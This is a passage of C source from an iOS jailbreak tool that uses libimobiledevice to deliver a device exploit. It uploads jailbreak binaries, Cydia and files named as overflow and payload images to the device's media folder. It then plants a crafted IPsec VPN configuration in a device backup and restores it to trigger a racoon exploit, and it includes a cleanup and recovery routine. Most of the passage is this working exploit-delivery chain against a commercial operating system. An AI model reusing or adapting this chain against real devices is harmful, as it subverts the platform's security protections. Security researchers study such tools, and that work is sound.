	afc_client_new(device->client, port, &afc);
	if (!afc) {
		status_cb("ERROR: Could not connect to AFC service", 0);
		device_free(device);
		return -1;
	}

	// make sure directory exists
	afc_make_directory(afc, "/corona");

	// remove all files in it
	rmdir_recursive_afc(afc, "/corona", 0);

	// upload files
	afc_upload_file2(afc, stage2_conf, "/corona/racoon-exploit-bootstrap.conf");

	afc_upload_file(afc, "data/common/corona/Cydia.tgz", "/corona");
	afc_upload_file(afc, "data/common/corona/jailbreak", "/corona");
	afc_upload_file(afc, "data/common/corona/jb.plist", "/corona");

	afc_upload_file(afc, "data/common/corona/tar", "/corona");
	afc_upload_file(afc, "data/common/corona/gzip", "/corona");

	afc_upload_file(afc, "data/common/corona/cleanup", "/corona");
	afc_upload_file(afc, "data/common/corona/filemover", "/corona");
	afc_upload_file(afc, "data/common/corona/filemover.plist", "/corona");

	char tmpfn[512];

	sprintf(tmpfn, "data/%s/%s/corona/corona.tgz", build, product);
	afc_upload_file(afc, tmpfn, "/corona");
	sprintf(tmpfn, "data/common/corona/vnimage.clean", build, product);
	afc_upload_file(afc, tmpfn, "/corona");
	sprintf(tmpfn, "data/%s/%s/corona/vnimage.overflow", build, product);
	afc_upload_file(afc, tmpfn, "/corona");
	sprintf(tmpfn, "data/%s/%s/corona/vnimage.payload", build, product);
	afc_upload_file(afc, tmpfn, "/corona");

	afc_client_free(afc);
	afc = NULL;
	device_free(device);
	device = NULL;

	free(product);
	product = NULL;
	free(build);
	build = NULL;

	/********************************************************/
	/* add com.apple.ipsec.plist to backup */
	/********************************************************/
	status_cb(NULL, 85);
	backup = backup_open(backup_directory, uuid);
	if (!backup) {
		error("ERROR: failed to open backup\n");
		goto fix;
	}
	char* ipsec_plist = NULL;
	int ipsec_plist_size = 0;
	file_read(stage1_conf, (unsigned char**)&ipsec_plist, &ipsec_plist_size);
	if(ipsec_plist != NULL && ipsec_plist_size > 0) {
		bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/com.apple.ipsec.plist");
		if (bf) {
			debug("com.apple.ipsec.plist already present, replacing\n");
			backup_file_assign_file_data(bf, ipsec_plist, ipsec_plist_size, 0);
			backup_file_set_length(bf, ipsec_plist_size);
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				error("ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		} else {
			debug("adding com.apple.ipsec.plist\n");
			bf = backup_file_create_with_data(ipsec_plist, strlen(ipsec_plist), 0);
			backup_file_set_domain(bf, "SystemPreferencesDomain");
			backup_file_set_path(bf, "SystemConfiguration/com.apple.ipsec.plist");
			backup_file_set_mode(bf, 0100644);
			backup_file_set_inode(bf, 123456);
			backup_file_set_uid(bf, 0);
			backup_file_set_gid(bf, 0);
			unsigned int tm = (unsigned int)(time(NULL));
			backup_file_set_time1(bf, tm);
			backup_file_set_time2(bf, tm);
			backup_file_set_time3(bf, tm);
			backup_file_set_length(bf, strlen(ipsec_plist));
			backup_file_set_flag(bf, 4);
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				error("ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		}
		backup_file_free(bf);
		backup_free(backup);

		/********************************************************/
		/* restore backup WITHOUT REBOOT */
		/********************************************************/
		status_cb(NULL, 90);
		char* nrargv[] = {
			"idevicebackup2",
			"restore",
			"--system",
			"--settings",
			backup_directory,
			NULL
		};
		idevicebackup2(5, nrargv);
		free(ipsec_plist);
	} else {
		status_cb("ERROR: no com.apple.ipsec.plist found. Aborting.", 0);
		sleep(5);
		goto fix_all;
	}

	/********************************************************/
	/* here, we're done. the user needs to activate the exploit */
	/********************************************************/
	status_cb(NULL, 95);
	rmdir_recursive(backup_directory);

	status_cb("Almost done – just unlock the screen if necessary, then tap the \"Absinthe\" icon to finish. (It might be on a different homescreen, so don't give up looking!)", 100);

	goto leave;

fix_all:
	/********************************************************/
	/* Cleanup backup: remove VPN connection and webclip */
	/********************************************************/
	status_cb("Trying to recover...\n", 0);
	backup = backup_open(backup_directory, uuid);
	if (!backup) {
		error("ERROR: failed to open backup\n");
		goto fix;
	}
	bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/preferences.plist");
	if (bf) {
		char* fn = backup_get_file_path(backup, bf);
		if (!fn) {
			error("Huh, backup path for preferences.plist not found?!\n");
			goto fix;
		}

		unsigned char* prefs = NULL;
		uint32_t plen = 0;

		if (file_read(fn, &prefs, &plen) > 8) {
			plist_t pl = NULL;
			if (memcmp(prefs, "bplist00", 8) == 0) {
				plist_from_bin(prefs, plen, &pl);
			} else {
				plist_from_xml(prefs, plen, &pl);
			}
			free(prefs);
			plen = 0;
			prefs = NULL;

			debug("remove VPN connection\n");
			prefs_remove_entry_if_present(&pl);

			plist_to_bin(pl, (char**)&prefs, &plen);

			backup_file_assign_file_data(bf, prefs, plen, 1);
			free(prefs);
			prefs = NULL;
			backup_file_set_length(bf, plen);
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				error("ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		} else {
			error("Could not open '%s'\n", fn);
		}
		free(fn);
	} else {
		error("ERROR: could not locate preferences.plist in backup.\n");
	}
	backup_file_free(bf);

	status_cb(NULL, 10);
	bf = backup_get_file(backup, "HomeDomain", "Library/WebClips/corona.webclip/Info.plist");
	if (bf) {
		backup_remove_file(backup, bf);
		backup_file_free(bf);
	}

	status_cb(NULL, 20);
	bf = backup_get_file(backup, "HomeDomain", "Library/WebClips/corona.webclip/icon.png");
	if (bf) {
		backup_remove_file(backup, bf);
		backup_file_free(bf);
	}

	status_cb(NULL, 30);
	bf = backup_get_file(backup, "HomeDomain", "Library/WebClips/corona.webclip");
	if (bf) {
		backup_remove_file(backup, bf);
		backup_file_free(bf);
	}
	backup_write_mbdb(backup);
	backup_free(backup);
	device_free(device);

	/********************************************************/
	/* restore backup */
	/********************************************************/
	status_cb(NULL, 40);
	char* frargv[] = {
		"idevicebackup2",
		"restore",
		"--system",
		"--settings",
		"--reboot",
		backup_directory,
		NULL
	};
	idevicebackup2(6, frargv);

	/********************************************************/
	/* wait for device reboot */
	/********************************************************/
	status_cb("The device will reboot now. DO NOT disconnect until the failure recovery procedure is completed.", 50);

	// wait for disconnect
	while (connected) {
		sleep(2);
	}
	debug("Device %s disconnected\n", uuid);

	// wait for device to connect
	while (!connected) {
		sleep(2);
	}
	debug("Device %s detected. Connecting...\n", uuid);
	status_cb("Device detected, connecting...\n", 60);
	sleep(2);

	/********************************************************/
	/* connect and move back dirs */
	/********************************************************/
	device = device_create(uuid);
	if (!device) {
		status_cb("ERROR: Could not connect to device. Aborting.\n", 0);
		return -1;
	}

	lockdown = lockdown_open(device);
	if (!lockdown) {
		device_free(device);
		status_cb("ERROR: Could not connect to lockdownd. Aborting.\n", 0);
		return -1;
	}

	port = 0;
	if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
		lockdown_free(lockdown);
		device_free(device);
		status_cb("ERROR: Failed to start AFC service. Aborting.\n", 0);
		return -1;
	}
	lockdown_free(lockdown);

	afc_client_new(device->client, port, &afc);
	if (!afc) {
		status_cb("ERROR: Could not connect to AFC. Aborting.\n", 0);
		goto leave;
	}
	debug("moving back files...\n");

	status_cb("Recovering files...", 65);

	list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		error("Hmm... the folder '%s' does not exist or is not accessible...\n", AFCTMP);
	}

	i = 0;
	while (list && list[i]) {
		if (!strcmp(list[i], ".") || !strcmp(list[i], "..")) {
			i++;
			continue;
		}

		char* tmpname = (char*)malloc(1+strlen(list[i])+1);
		strcpy(tmpname, "/");
		strcat(tmpname, list[i]);
		rmdir_recursive_afc(afc, tmpname, 1);

		char* tmxname = (char*)malloc(1+strlen(AFCTMP)+1+strlen(list[i])+1);
		strcpy(tmxname, "/"AFCTMP"/");
		strcat(tmxname, list[i]);

		debug("moving %s to %s\n", tmxname, tmpname);
		afc_rename_path(afc, tmxname, tmpname);

		free(tmxname);
		free(tmpname);

		i++;
	}
	free_dictionary(list);

	/********************************************************/
	/* wait for device to finish booting to springboard */
	/********************************************************/
	status_cb("Waiting for device to finish booting...", 70);

	lockdown = lockdown_open(device);
	if (!lockdown) {
		status_cb("ERROR: Could not connect to lockdownd. Aborting.\n", 0);
		goto leave;
	}

	retries = 100;
	done = 0;
	sbsc = NULL;
	state = NULL;

	while (!done && (retries-- > 0)) {
		port = 0;
		lockdown_start_service(lockdown, "com.apple.springboardservices", &port);
		if (!port) {
			continue;
		}
		sbsc = NULL;
		sbservices_client_new(device->client, port, &sbsc);
		if (!sbsc) {
			continue;
		}
		if (sbservices_get_icon_state(sbsc, &state, "2") == SBSERVICES_E_SUCCESS) {
			plist_free(state);
			state = NULL;
			done = 1;
		}
		sbservices_client_free(sbsc);
		if (done) {
			debug("bootup complete\n");
			break;
		}
		sleep(3);
	}
	lockdown_free(lockdown);
	lockdown = NULL;

	/********************************************************/
	/* move back any remaining dirs via AFC */
	/********************************************************/
fix:
	status_cb("Recovering files...", 80);
	if (!afc) {
		lockdown = lockdown_open(device);
		port = 0;
		if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
			status_cb("ERROR: Could not start AFC service. Aborting.", 0);
			lockdown_free(lockdown);
			goto leave;
		}
		lockdown_free(lockdown);

		afc_client_new(device->client, port, &afc);
		if (!afc) {
			status_cb("ERROR: Could not connect to AFC. Aborting.\n", 0);
			goto leave;
		}
	}

	status_cb(NULL, 90);

	list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		//fprintf(stderr, "Uh, oh, the folder '%s' does not exist or is not accessible...\n", AFCTMP);
	}

	i = 0;
	while (list && list[i]) {
		if (!strcmp(list[i], ".") || !strcmp(list[i], "..")) {
			i++;
			continue;
		}

		char* tmpname = (char*)malloc(1+strlen(list[i])+1);
		strcpy(tmpname, "/");
		strcat(tmpname, list[i]);
		rmdir_recursive_afc(afc, tmpname, 1);

		char* tmxname = (char*)malloc(1+strlen(AFCTMP)+1+strlen(list[i])+1);
		strcpy(tmxname, "/"AFCTMP"/");
		strcat(tmxname, list[i]);

		debug("moving %s to %s\n", tmxname, tmpname);
		afc_rename_path(afc, tmxname, tmpname);

		free(tmxname);
		free(tmpname);

		i++;
	}
	free_dictionary(list);

	status_cb(NULL, 95);
	afc_remove_path(afc, "/"AFCTMP);
	if (afc_read_directory(afc, "/"AFCTMP, &list) == AFC_E_SUCCESS) {
		fprintf(stderr, "WARNING: the folder /"AFCTMP" is still present in the user's Media folder. You have to check yourself for any leftovers and move them back if required.\n");
	}

	rmdir_recursive(backup_directory);

	status_cb("Recovery completed. If you want to retry jailbreaking, unplug your device and plug it back in.", 100);

leave:
	afc_client_free(afc);
	afc = NULL;
	device_free(device);
	device = NULL;

	return 0;
}
